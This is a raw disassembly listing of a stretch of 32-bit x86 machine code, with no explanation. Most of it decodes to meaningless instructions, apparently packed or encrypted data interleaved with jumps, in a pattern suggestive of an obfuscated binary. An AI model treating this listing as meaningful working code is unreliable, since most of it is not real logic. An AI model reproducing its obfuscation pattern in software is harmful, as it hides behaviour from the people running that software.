  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx-0x31130d5f],ecx
  4113db:	in     al,0x1
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411431
  4113e5:	or     eax,0xfaf0a16
  4113ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113eb:	std    
  4113ec:	sti    
  4113ed:	lock repz push ds
  4113f0:	aaa    
  4113f1:	xchg   ecx,eax
  4113f2:	xchg   ebp,eax
  4113f3:	cmp    DWORD PTR [ecx-0x1],esp
  4113f6:	hlt    
  4113f7:	xchg   ebp,eax
  4113f8:	mov    ebp,0xfc100672
  4113fd:	jmp    0x4c074b18
  411402:	je     0x411462
  411404:	cs push esi
  411406:	aad    0xd6
  411408:	cwde   
  411409:	adc    ebp,ecx
  41140b:	addr16 push eax
  41140d:	xor    eax,DWORD PTR [eax+0xe]
  411410:	xchg   ebx,eax
  411411:	adc    ecx,DWORD PTR [ecx+ebx*8]
  411414:	out    0x9c,al
  411416:	xor    al,0x7
  411418:	dec    eax
  411419:	fsub   st,st(2)
  41141b:	(bad)  [edx+0x5]
  41141e:	aaa    
  41141f:	push   ecx
  411420:	bswap  ebp
  411422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411423:	xchg   ebx,eax
  411424:	stos   DWORD PTR es:[edi],eax
  411425:	sub    DWORD PTR [edi],edx
  411427:	mov    ebx,0x7f3b6601
  41142c:	adc    ah,BYTE PTR [esi]
  41142e:	in     al,0x51
  411430:	call   0xbfb5:0x97c5bf1d
  411437:	add    al,BYTE PTR [eax+0x4734977f]
  41143d:	xor    esp,DWORD PTR [esi-0x39]
  411440:	mov    ds:0xb54ede59,eax
  411445:	jecxz  0x4114ad
  411447:	call   0x3210b562
  41144c:	jns    0x4113f9
  41144e:	xchg   edi,eax
  41144f:	or     edx,DWORD PTR [edi+ebx*4]
  411452:	jle    0x41147b
  411454:	popa   
  411455:	inc    edi
  411456:	into   
  411457:	sbb    BYTE PTR [eax],dl
  411459:	jmp    0x55ad:0x63b30c4
  411460:	or     eax,0x90e4d350
  411465:	cmc    
  411466:	xlat   BYTE PTR ds:[ebx]
  411467:	mov    esi,0xc4f72de0
  41146c:	fs jle 0x41140d
  41146f:	sub    ebx,esi
  411471:	mov    DWORD PTR [ecx],edx
  411473:	in     al,dx
  411474:	dec    edi
  411475:	test   eax,0xc7f05362
  41147a:	mov    ds:0x42b5810e,al
  41147f:	pop    ebx
  411480:	adc    DWORD PTR gs:[ebx-0x70],ebp
  411484:	or     DWORD PTR [ebp+0x78a409fd],ebx
  41148a:	shl    DWORD PTR [esi-0x3c3646cc],cl
  411490:	(bad)  
  411491:	and    eax,0x4140ecff
  411496:	hlt    
  411497:	jle    0x411498
  411499:	inc    esp
  41149a:	fdivr  DWORD PTR ds:[esi+0x528ea848]
  4114a1:	in     al,0x58
  4114a3:	retf   0x8e8a
  4114a6:	push   ebp
  4114a7:	fnstcw WORD PTR [ecx+0x24dc3490]
  4114ad:	daa    
  4114ae:	popf   
  4114af:	je     0x411497
  4114b1:	fidiv  WORD PTR [ebx-0x47]
  4114b4:	jecxz  0x411526
  4114b6:	outs   dx,BYTE PTR fs:[esi]
  4114b8:	(bad)  
  4114b9:	jge    0x41149d
  4114bb:	pop    ebx
  4114bc:	push   es
  4114bd:	sbb    eax,0x6961bbff
  4114c2:	inc    edx
  4114c3:	shr    BYTE PTR [esi+0x469a345b],0x48
  4114ca:	and    BYTE PTR [ebx+0x40],bh
  4114cd:	cmc    
  4114ce:	stc    
  4114cf:	inc    ecx
  4114d0:	sbb    bl,cl
  4114d2:	mov    ds:0x5947b44b,al
  4114d7:	jb     0x411473
  4114d9:	push   edx
  4114da:	jae    0x411527
  4114dc:	xchg   esi,eax
  4114dd:	lds    ebp,FWORD PTR [esi+ebx*8]
  4114e0:	shl    BYTE PTR [ebx-0x79c94a75],cl
  4114e6:	loopne 0x411477
  4114e8:	test   BYTE PTR ds:0x701d7fcc,bl
  4114ee:	(bad)  
  4114ef:	test   al,0xeb
  4114f1:	rcr    DWORD PTR [ebx+0x39ae169e],cl
  4114f7:	add    cl,dh
  4114f9:	iret   
  4114fa:	rcr    DWORD PTR ds:0x7d3e40a3,1
  411500:	outs   dx,DWORD PTR ds:[esi]
  411502:	in     eax,0xfc
  411504:	jmp    0xedb48973
  411509:	fdiv   QWORD PTR [ecx]
  41150b:	xor    DWORD PTR [ebp+0x6d84e05e],edi
  411511:	enter  0xd765,0xb8
  411515:	pusha  
  411516:	mov    ds:0x864106b1,al
  41151b:	inc    esi
  41151c:	test   eax,0x3593795f
  411521:	xlat   BYTE PTR ds:[ebx]
  411522:	inc    eax
  411523:	ja     0x4114e0
  411525:	lods   al,BYTE PTR ds:[esi]
  411526:	mov    cl,0xde
  411528:	fxch   st(2)
  41152a:	ins    DWORD PTR es:[edi],dx
  41152b:	add    BYTE PTR [edx],dh
  41152d:	retf   0x2d7f
  411530:	xor    al,0xbf
  411532:	es into 
  411534:	jno    0x411532
  411536:	fisttp WORD PTR [ebp+edi*4-0x21]
  41153a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41153b:	xchg   esp,eax
  41153c:	xlat   BYTE PTR ds:[ebx]
  41153d:	pop    ecx
  41153e:	dec    ecx
  41153f:	sbb    al,0xbf
  411541:	das    
  411542:	repz data16 mov bh,0x71
  411546:	sub    bl,ah
  411548:	push   es
  411549:	dec    esp
  41154a:	xchg   esp,eax
  41154b:	out    0x3,eax
  41154d:	xchg   esp,eax
  41154e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  411550:	pop    ss
  411551:	aas    
  411552:	mov    ss,WORD PTR [ecx+0x1aaa1f03]
  411558:	call   0x6c56:0xd4afa3ac
  41155f:	les    ebp,FWORD PTR [eax]
  411561:	test   DWORD PTR [edi],ecx
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	mov    esi,0x80726504
  411586:	inc    ecx
  411587:	jle    0x411607
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115b5
  41158e:	push   DWORD PTR [ebp+0x8f3dfac]
  411594:	or     DWORD PTR [edi-0x72879964],ebx
  41159a:	test   DWORD PTR [esi+esi*8-0x6b],ebp
  41159e:	push   eax
  41159f:	repz sti 
  4115a1:	scas   al,BYTE PTR es:[edi]
  4115a2:	pop    ds
  4115a3:	fcom   DWORD PTR ds:0xe4412ece
  4115a9:	repz cli 
  4115ab:	rcl    BYTE PTR [edi],cl
  4115ad:	cwde   
  4115ae:	or     al,0x8e
  4115b0:	fsub   DWORD PTR [edx-0x7]
  4115b3:	and    al,BYTE PTR [ecx-0x7b9d2def]
  4115b9:	jmp    0x4115ac
  4115bb:	push   ss
  4115bc:	push   ecx
  4115bd:	sbb    eax,0xbe186233
  4115c2:	(bad)  
  4115c3:	fbstp  TBYTE PTR [esi]
  4115c5:	out    dx,al
  4115c6:	aam    0xdd
  4115c8:	cmp    ah,BYTE PTR [ebx+0x50ee0973]
  4115ce:	mov    ah,0x94
  4115d0:	fdivr  st(7),st
  4115d2:	cdq    
  4115d3:	scas   al,BYTE PTR es:[edi]
  4115d4:	or     BYTE PTR [eax],bl
  4115d6:	aas    
  4115d7:	das    
  4115d8:	into   
  4115d9:	xchg   ebp,eax
  4115da:	pop    ss
  4115db:	xchg   esi,eax
  4115dc:	or     al,0xa9
  4115de:	inc    edx
  4115df:	daa    
  4115e0:	pop    edi
  4115e1:	leave  
  4115e2:	xor    al,0x83
  4115e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115e5:	xchg   esp,eax
  4115e6:	pop    edx
  4115e7:	push   ebx
  4115e8:	inc    ecx
  4115e9:	ret    0x9106
  4115ec:	adc    BYTE PTR [edx],cl
  4115ee:	push   esi
  4115ef:	pop    esp
  4115f0:	outs   dx,BYTE PTR ds:[esi]
  4115f1:	sbb    esp,DWORD PTR [ebp-0x9ee1000]
  4115f7:	adc    eax,0x7cf3c96e
  4115fc:	sub    ah,ah
  4115fe:	out    0xfd,eax
  411600:	mov    ch,0xca
  411602:	dec    ebx
  411603:	(bad)  [ebx]
  411605:	inc    ebx
  411606:	mov    esi,0xbf7d4852
  41160b:	jge    0x4115ef
  41160d:	rol    ebx,cl
  41160f:	popa   
  411610:	adc    al,0x91
  411612:	fstp   DWORD PTR [eax]
  411614:	cmp    eax,0x86f89c37
  411619:	jb     0x411667
  41161b:	xlat   BYTE PTR ds:[ebx]
  41161c:	push   0xa88bdb09
  411621:	scas   al,BYTE PTR es:[edi]
  411622:	retf   0x2309
  411625:	out    0x4e,al
  411627:	stc    
  411628:	fstp   QWORD PTR [edi+0x7481db57]
  41162e:	stos   BYTE PTR es:[edi],al
  41162f:	mov    eax,DWORD PTR [ebx+ebp*2+0x1d]
  411633:	adc    eax,0xbe6bfb1c
  411638:	(bad)  
  411639:	into   
  41163a:	jp     0x4115fb
  41163c:	sar    DWORD PTR [eax+0x2ad43ecd],cl
  411642:	pop    ebx
  411643:	jg     0x411608
  411645:	jmp    0x411629
  411647:	xor    ebp,esi
  411649:	add    BYTE PTR [ebp+0x5f],cl
  41164c:	fidiv  WORD PTR [ecx+0x597b63dc]
  411652:	js     0x411638
  411654:	mov    WORD PTR [edi+0x39ec91d],cs
  41165a:	cmp    ch,BYTE PTR [ecx-0x418b1413]
  411660:	mov    ecx,edx
  411662:	rcr    DWORD PTR [ebx],0x28
  411665:	aam    0x65
  411667:	adc    DWORD PTR [eax-0x5],0x78
  41166b:	cmp    eax,0x89154c19
  411670:	jecxz  0x411676
  411672:	xchg   ebx,eax
  411673:	(bad)  
  411674:	mov    dl,0x8b
  411676:	sub    DWORD PTR [eax-0x18],ecx
  411679:	inc    eax
  41167a:	imul   esp,DWORD PTR [eax+0x29a6525],0x6f
  411681:	pop    edi
  411682:	and    eax,0x20c238df
  411687:	sbb    bh,ah
  411689:	mov    esp,0x4e6c1c04
  41168e:	stos   DWORD PTR es:[edi],eax
  41168f:	sbb    esp,DWORD PTR ds:0xb3547f07
  411695:	or     ecx,DWORD PTR [ecx+0x562a9a9a]
  41169b:	add    DWORD PTR [esi],ecx
  41169d:	xchg   edx,eax
  41169e:	and    al,0x94
  4116a0:	or     dh,0xc3
  4116a3:	lahf   
  4116a4:	mov    esp,eax
  4116a6:	push   edi
  4116a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a8:	cmp    al,0xd2
  4116aa:	pop    ebx
  4116ab:	xchg   esp,eax
  4116ac:	xor    DWORD PTR [ebp+ebx*1+0xd],0xffffffa7
  4116b1:	and    cl,BYTE PTR [ebx+0x4cf0a45f]
  4116b7:	sahf   
  4116b8:	je     0x41168f
  4116ba:	push   0x7f
  4116bc:	imul   BYTE PTR [eax+ebp*2+0x4d]
  4116c0:	out    dx,eax
  4116c1:	push   ecx
  4116c2:	mov    esi,0xfdea5a8
  4116c7:	mov    al,0x10
  4116c9:	div    DWORD PTR [eax]
  4116cb:	cdq    
  4116cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cd:	xchg   DWORD PTR [ecx],ebx
  4116cf:	gs jge 0x41171d
  4116d2:	add    al,BYTE PTR [edi]
  4116d4:	fimul  DWORD PTR [ebp+0x487942e9]
  4116da:	ja     0x411710
  4116dc:	cwde   
  4116dd:	and    ah,BYTE PTR [ebx-0x1f]
  4116e0:	punpckhwd mm4,QWORD PTR [ebx]
  4116e3:	inc    ecx
  4116e4:	ins    BYTE PTR es:[edi],dx
  4116e5:	xor    eax,0x474df0fd
  4116ea:	cs aad 0x24
  4116ed:	outs   dx,BYTE PTR ds:[esi]
  4116ee:	jl     0x411708
  4116f0:	pop    es
  4116f1:	cmp    esi,ecx
  4116f3:	call   0xfadecb72
  4116f8:	or     edi,DWORD PTR [ecx-0x7f76f706]
  4116fe:	or     DWORD PTR [edi-0x49ada99e],eax
  411704:	pusha  
  411705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411706:	adc    cl,bh
  411708:	jl     0x4116f9
  41170a:	mov    eax,ds:0x104d8b5b
  41170f:	add    eax,esi
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0xfc076e56
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411799
  41178e:	jmp    0x41180d
  411790:	cs fs jno 0x411810
  411794:	inc    ecx
  411795:	mov    esi,0xc2e5f8b9
  41179a:	pushf  
  41179b:	and    al,0xa8
  41179d:	sub    edi,eax
  41179f:	inc    ebp
  4117a0:	test   al,0x9
  4117a2:	push   cs
  4117a3:	mov    cl,0x99
  4117a5:	fmul   QWORD PTR [ecx]
  4117a7:	(bad)  
  4117a8:	mov    ebx,0x957e2627
  4117ad:	fistp  DWORD PTR [ebx]
  4117af:	adc    eax,DWORD PTR [edi+0x59d5e91e]
  4117b5:	gs jmp 0xdd7de8b8
  4117bb:	or     DWORD PTR [ebp-0x60d8522e],0xa8f7c9b9
  4117c5:	(bad)  
  4117c6:	shl    BYTE PTR [edx+0x543a3b2b],0xd
  4117cd:	push   edx
  4117ce:	cli    
  4117cf:	std    
  4117d0:	xchg   esi,eax
  4117d1:	cmp    DWORD PTR [ecx+0x2a55e1d2],esi
  4117d7:	fnstenv [edx+0x52]
  4117da:	mov    al,0x8f
  4117dc:	enter  0xc22d,0x2b
  4117e0:	lods   al,BYTE PTR ds:[esi]
  4117e1:	lock inc DWORD PTR [edi+0x230793d3]
  4117e8:	test   DWORD PTR [edi+esi*1-0x1c],0xa642175e
  4117f0:	sub    al,0xe6
  4117f2:	fldenv ds:0x79e9f8a3
  4117f8:	add    al,0x26
  4117fa:	mov    bl,0x4d
  4117fc:	pop    ebx
  4117fd:	mov    esi,0xdc9efb98
  411802:	add    BYTE PTR [eax+0x55],dh
  411805:	mov    edx,0xa71519aa
  41180a:	fcmove st,st(2)
  41180c:	and    bh,cl
  41180e:	in     al,dx
  41180f:	and    eax,0x30d55688
  411814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411815:	mov    edi,0xb0202615
  41181a:	cs mov esp,0xbb4f1975
  411820:	jmp    0x411860
  411822:	stos   BYTE PTR es:[edi],al
  411823:	inc    ebp
  411824:	icebp  
  411825:	mov    dl,ch
  411827:	pop    edx
  411828:	shl    DWORD PTR [ebx],cl
  41182a:	dec    esp
  41182b:	call   0x7a8adee0
  411830:	mov    ds,eax
  411832:	(bad)  
  411833:	lahf   
  411834:	gs jp  0x4117d7
  411837:	inc    esp
  411838:	fild   DWORD PTR [ebx]
  41183a:	adc    ah,BYTE PTR [eax+0x1f]
  41183d:	pop    ds
  41183e:	enter  0xe742,0x27
  411842:	pop    esi
  411843:	ds push ecx
  411845:	push   0xffffffe1
  411847:	dec    al
  411849:	pop    ss
  41184a:	jl     0x411886
  41184c:	add    eax,0x88da8c3c
  411851:	pop    eax
  411852:	cli    
  411853:	int3   
  411854:	sub    al,BYTE PTR [esi+0x3d]
  411857:	ds mov esp,0x571d151f
  41185d:	push   DWORD PTR [eax+0x31e559ae]
  411863:	and    DWORD PTR [ecx+0x50cb3271],edi
  411869:	lahf   
  41186a:	mov    ax,0x1a61
  41186e:	xchg   esp,eax
  41186f:	loop   0x41181b
  411871:	stos   BYTE PTR es:[edi],al
  411872:	fisub  WORD PTR [ebx-0x41]
  411875:	outs   dx,BYTE PTR ds:[esi]
  411876:	jmp    0xb0be1312
  41187b:	aas    
  41187c:	jne    0x4118b2
  41187e:	ins    DWORD PTR es:[edi],dx
  41187f:	xor    dl,ch
  411881:	and    eax,0xaf3b04d
  411886:	pop    ecx
  411887:	pop    es
  411888:	xor    BYTE PTR [ebx+eax*2],dl
  41188b:	add    dl,BYTE PTR [esi-0x78]
  41188e:	sbb    eax,0xb6d818e1
  411893:	iret   
  411894:	sub    al,0x94
  411896:	mov    cl,0xc8
  411898:	push   esi
  411899:	je     0x411840
  41189b:	ja     0x4118c7
  41189d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41189e:	inc    ebx
  41189f:	push   ebp
  4118a0:	ret    0x61ba
  4118a3:	clc    
  4118a4:	dec    ecx
  4118a5:	add    eax,0x88ba9934
  4118aa:	stc    
  4118ab:	push   ebp
  4118ac:	scas   eax,DWORD PTR es:[edi]
  4118ad:	mov    ebp,0x38c67e81
  4118b2:	xlat   BYTE PTR ds:[ebx]
  4118b3:	mov    BYTE PTR [ecx],al
  4118b5:	rcr    DWORD PTR [ebx+0xb],1
  4118b8:	fsubr  DWORD PTR [edx-0x48479dd4]
  4118be:	push   ss
  4118bf:	enter  0xd7f4,0x7b
  4118c3:	jmp    0x5e6f44f6
  4118c8:	push   ebx
  4118c9:	inc    edx
  4118ca:	cmp    al,0x33
  4118cc:	pop    esi
  4118cd:	popa   
  4118ce:	mov    ebx,0xd458376f
  4118d3:	pusha  
  4118d4:	dec    esi
  4118d5:	out    dx,eax
  4118d6:	mov    eax,0xbbc9635b
  4118db:	mov    eax,0xe54c6fd6
  4118e0:	adc    eax,0x1047939c
  4118e5:	and    BYTE PTR [esi-0x41],bh
  4118e8:	fwait
  4118e9:	sub    DWORD PTR [edi],0x1f
  4118ec:	cmp    ah,BYTE PTR [eax+0x7cfe04a3]
  4118f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f3:	or     eax,0x1f8925cb
  4118f8:	outs   dx,BYTE PTR ds:[esi]
  4118f9:	shl    BYTE PTR [ebx+ebx*8-0x3c],cl
  4118fd:	jns    0x4118f4
  4118ff:	retf   0x2974
  411902:	(bad)  [ebp-0x5088e95b]
  411908:	pop    ebp
  411909:	outs   dx,DWORD PTR ds:[esi]
  41190a:	mov    bl,0xe9
  41190c:	pop    ecx
  41190d:	or     DWORD PTR [ebx],esi
  41190f:	ins    BYTE PTR es:[edi],dx
  411910:	in     al,0x3a
  411912:	or     ecx,esp
  411914:	loope  0x4118ad
  411916:	test   BYTE PTR [esi*2-0x2e230930],al
  41191d:	stos   BYTE PTR es:[edi],al
  41191e:	jp     0x411912
  411920:	pop    esp
  411921:	cmp    BYTE PTR [edi-0x11225ae3],0x37
  411928:	sbb    cl,cl
  41192a:	stc    
  41192b:	sbb    al,BYTE PTR [edi]
  41192d:	fwait
  41192e:	rcl    edx,0x8c
  411931:	cmc    
  411932:	xchg   ecx,eax
  411933:	mov    esp,0x29de0cbd
  411938:	in     al,0xd4
  41193a:	jno    0x4118d1
  41193c:	cmp    BYTE PTR [ecx-0x35],bh
  41193f:	lds    ebp,FWORD PTR [ebx-0xc]
  411942:	sti    
  411943:	jb     0x411964
  411945:	ss sbb ecx,edx
  411948:	xchg   edi,eax
  411949:	dec    ebx
  41194a:	add    edx,ebp
  41194c:	das    
  41194d:	cwde   
  41194e:	pop    ebx
  41194f:	shr    DWORD PTR [ebp+ebx*8-0x39],1
  411953:	out    dx,eax
  411954:	rcr    DWORD PTR [edi],cl
  411956:	cwde   
  411957:	iret   
  411958:	pop    ss
  411959:	dec    edx
  41195a:	sahf   
  41195b:	lock sbb al,0x9
  41195e:	repnz pop esi
  411960:	mov    edx,0xe749037e
  411965:	add    BYTE PTR [esi-0x11],ch
  411968:	mov    al,0x51
  41196a:	pop    esi
  41196b:	push   edi
  41196c:	jmp    0x411935
  41196e:	adc    al,0x1
  411970:	and    al,0xcb
  411972:	adc    ebp,edi
  411974:	stos   BYTE PTR es:[edi],al
  411975:	adc    al,0x16
  411977:	push   0xffffffcb
  411979:	sbb    esp,0x6c5a37d
  41197f:	jle    0x41197e
  411981:	repnz lock lea esp,[esi+0x57]
  411986:	aaa    
  411987:	test   DWORD PTR [edi-0x8],0xed6e6c07
  41198e:	dec    ecx
  41198f:	inc    esi
  411990:	push   0x530ef956
  411995:	pushf  
  411996:	out    0x6,eax
  411998:	rdtsc  
  41199a:	mov    ch,0xc2
  41199c:	xor    eax,edx
  41199e:	fcompp 
  4119a0:	mov    cl,BYTE PTR [ebp+0x59]
  4119a3:	jmp    eax
  4119a5:	mov    dl,bh
  4119a7:	jg     0x41198d
  4119a9:	test   al,0xa7
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x60
  411a13:	test   DWORD PTR [edi+ebx*8+0x7e7e4d25],esi
  411a1a:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411a1e:	mov    eax,ds:0xb4a61001
  411a23:	xorps  xmm5,XMMWORD PTR [esi]
  411a26:	push   0xfffffffd
  411a28:	add    BYTE PTR [edx-0x31],al
  411a2b:	ins    DWORD PTR es:[edi],dx
  411a2c:	mov    ah,0xa4
  411a2e:	sbb    eax,0x7c09d1ab
  411a33:	std    
  411a34:	lock maxps xmm0,XMMWORD PTR [edi-0x41cb4eda]
  411a3c:	das    
  411a3d:	mov    bh,0x95
  411a3f:	sub    DWORD PTR [edx-0x59],eax
  411a42:	xlat   BYTE PTR ds:[ebx]
  411a43:	add    eax,0xe3f3d6cb
  411a48:	iret   
  411a49:	push   ebx
  411a4a:	add    dl,dh
  411a4c:	lods   eax,DWORD PTR ds:[esi]
  411a4d:	es in  al,0x3d
  411a50:	and    ecx,DWORD PTR [esi]
  411a52:	repz sbb esp,DWORD PTR [edx+0x5d]
  411a56:	push   eax
  411a57:	cmp    eax,0xf8f2328f
  411a5c:	rcl    eax,0x5b
  411a5f:	jno    0x411a3f
  411a61:	or     eax,DWORD PTR [edi]
  411a63:	shr    DWORD PTR [eax-0x18],cl
  411a66:	add    esi,DWORD PTR [eax]
  411a68:	push   eax
  411a6a:	outs   dx,BYTE PTR ds:[esi]
  411a6b:	xchg   ecx,eax
  411a6c:	pop    ds
  411a6d:	fmul   DWORD PTR [ebp-0x6d]
  411a70:	sub    al,BYTE PTR [esi]
  411a72:	(bad)  
  411a73:	fmul   DWORD PTR [ecx]
  411a75:	js     0x411aa8
  411a77:	int3   
  411a78:	enter  0x6b64,0x87
  411a7c:	xchg   ebx,eax
  411a7d:	sbb    DWORD PTR [ebx+0x9f3f26a],0xcb1019d5
  411a87:	out    0xdd,eax
  411a89:	(bad)  
  411a8a:	rcl    BYTE PTR [eax-0x54],0x57
  411a8e:	les    ebx,FWORD PTR [edx+0x3124b2db]
  411a94:	add    edx,ebp
  411a96:	imul   ebx,DWORD PTR [esi],0x19
  411a99:	push   ebp
  411a9a:	push   cs
  411a9b:	(bad)  
  411a9c:	sub    al,BYTE PTR [edx+0x23]
  411a9f:	and    BYTE PTR [edx-0x12ffd962],0x51
  411aa6:	push   ebp
  411aa7:	fwait
  411aa8:	sbb    eax,0x143458e2
  411aad:	iret   
  411aae:	push   ds
  411aaf:	sub    ah,ah
  411ab1:	cmp    ah,BYTE PTR [ecx]
  411ab3:	dec    esi
  411ab4:	(bad)  
  411ab5:	inc    ebp
  411ab7:	xchg   edx,eax
  411ab8:	xchg   BYTE PTR [edx],bh
  411aba:	test   al,0x29
  411abc:	test   DWORD PTR [ebp-0x37],0x9fd22a4c
  411ac3:	bound  edi,QWORD PTR [eax+edi*2]
  411ac6:	inc    esi
  411ac7:	adc    ebx,esi
  411ac9:	fwait
  411aca:	mov    esp,ds
  411acc:	cwde   
  411acd:	(bad)  
  411acf:	jnp    0x411ac0
  411ad1:	ins    DWORD PTR es:[edi],dx
  411ad2:	cwde   
  411ad3:	in     eax,0xe9
  411ad5:	or     eax,0x7d9f9c08
  411ada:	inc    edi
  411adb:	sbb    eax,0x35d299e5
  411ae0:	dec    esp
  411ae1:	dec    edx
  411ae2:	xchg   DWORD PTR [ebp+0x75],esp
  411ae5:	xor    bh,BYTE PTR [edi-0x75]
  411ae8:	pushf  
  411ae9:	int    0x75
  411aeb:	push   edi
  411aec:	mov    dl,0xc2
  411aee:	es popf 
  411af0:	mov    ah,0x33
  411af2:	xor    dh,BYTE PTR [edi-0x58d1d3f0]
  411af8:	sbb    ch,BYTE PTR [edx]
  411afa:	ds cmc 
  411afc:	sbb    ebp,DWORD PTR [eax]
  411afe:	aas    
  411aff:	mov    edi,DWORD PTR [esi]
  411b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b02:	cmp    bh,BYTE PTR ss:[esi-0x5b249867]
  411b09:	cwde   
  411b0a:	cmp    cl,BYTE PTR [ebx]
  411b0c:	pop    ss
  411b0d:	and    ah,BYTE PTR [eax-0x57]
  411b10:	push   esi
  411b11:	imul   ecx,edx,0xffffff8c
  411b14:	sbb    ebp,0x3a29eedc
  411b1a:	mov    al,0x5
  411b1c:	cwde   
  411b1d:	push   cs
  411b1e:	leave  
  411b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b20:	sbb    eax,0xa044e286
  411b25:	and    eax,0x9b2f81bb
  411b2a:	and    ebx,DWORD PTR [eax-0x7d]
  411b2d:	hlt    
  411b2e:	pop    edx
  411b2f:	inc    ecx
  411b30:	mov    DWORD PTR [ecx-0x32],ebx
  411b33:	enter  0x1518,0x7b
  411b37:	fwait
  411b38:	and    edx,DWORD PTR [edx]
  411b3a:	(bad)  
  411b3b:	dec    esi
  411b3c:	mov    ds:0xbdcd0299,eax
  411b41:	mov    edi,0xcf1bcd08
  411b46:	mov    ds:0x8dff639e,eax
  411b4b:	sbb    dh,BYTE PTR [esi+0x1da85d27]
  411b51:	xor    bl,al
  411b53:	popa   
  411b54:	cld    
  411b55:	and    al,BYTE PTR [ecx+0x484aba7c]
  411b5b:	and    al,0x4b
  411b5d:	test   BYTE PTR [ebp+0x5],0xa4
  411b61:	fisttp WORD PTR [eax]
  411b63:	test   al,0xf3
  411b65:	xchg   DWORD PTR [esi-0x1e],ecx
  411b68:	mov    ds:0xebd90b75,al
  411b6d:	imul   ecx,DWORD PTR [ecx+ebx*8+0xd],0xa44ebc8d
  411b75:	xor    BYTE PTR [ecx+0x36863d25],dl
  411b7b:	xchg   DWORD PTR [edx-0x5],ebp
  411b7e:	js     0x411b4e
  411b80:	fwait
  411b81:	test   bh,dl
  411b83:	clc    
  411b84:	mov    ah,0xb7
  411b86:	xor    eax,0x23b78f18
  411b8b:	hlt    
  411b8c:	mov    eax,0x42658242
  411b91:	add    ebp,DWORD PTR [ebx-0x24]
  411b94:	sti    
  411b95:	jo     0x411b3b
  411b97:	retf   
  411b98:	lods   eax,DWORD PTR ds:[esi]
  411b99:	(bad)  
  411b9a:	xor    BYTE PTR [ebp+0x72],ch
  411b9d:	stos   DWORD PTR es:[edi],eax
  411b9e:	outs   dx,DWORD PTR ds:[esi]
  411b9f:	inc    edx
  411ba0:	jns    0x411b97
  411ba2:	retf   0x5287
  411ba5:	add    DWORD PTR [ecx-0x490a867c],eax
  411bab:	push   ebp
  411bac:	ins    DWORD PTR es:[edi],dx
  411bad:	mov    eax,0xf3cd0249
  411bb2:	fwait
  411bb3:	add    ebx,DWORD PTR [edi+edi*1+0x17]
  411bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb8:	in     al,dx
  411bb9:	jmp    0x411c0c
  411bbb:	xor    BYTE PTR [ebx-0x12],cl
  411bbe:	mov    dl,0xa1
  411bc0:	cmp    al,0x3c
  411bc2:	dec    eax
  411bc3:	push   ebp
  411bc4:	das    
